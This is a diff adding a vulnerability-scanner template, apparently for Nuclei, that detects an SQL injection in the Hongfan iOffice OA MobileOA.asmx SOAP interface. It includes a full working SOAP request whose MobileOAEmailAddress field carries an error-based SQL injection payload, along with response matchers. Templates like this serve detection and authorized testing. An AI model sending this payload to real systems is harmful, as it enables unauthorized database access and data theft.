@@ -1,0 +1,38 @@
+id: hongfan-ioffice-mobileoa-sqli
+
+info:
+  name: 红帆OA MobileOAEmailAddress SQL注入漏洞
+  author: onewin
+  severity: critical
+  description: |
+    红帆OA MobileOA.asmx 接口的 `MobileOAEmailAddress` 参数存在SQL注入漏洞，攻击者可通过构造恶意SOAP请求执行任意SQL命令，导致数据库信息泄露。
+    [漏洞发现时间：2025年7月]
+  reference:
+    - https://example.com/hongfan-mobileoa-sqli (替换为实际参考链接)
+  tags: 红帆-ioffice
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/iOffice/prg/set/wss/MobileOA.asmx"
+    headers:
+      Content-Type: text/xml; charset=utf-8
+      SOAPAction: "http://tempuri.org/GeMrNewData"
+    body: |
+      <?xml version="1.0" encoding="utf-8"?>
+      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+          <GeMrNewData xmlns="http://tempuri.org/">
+            <MobileOAEmailAddress>' AND 5079 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5079=5079) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(98)+CHAR(113)))-- eqJq</MobileOAEmailAddress>
+          </GeMrNewData>
+        </soap:Body>
+      </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "qzbq1qjpbq"  # 布尔盲注成功时的特定回显
+        part: body
+      - type: status
+        status:
+          - 500
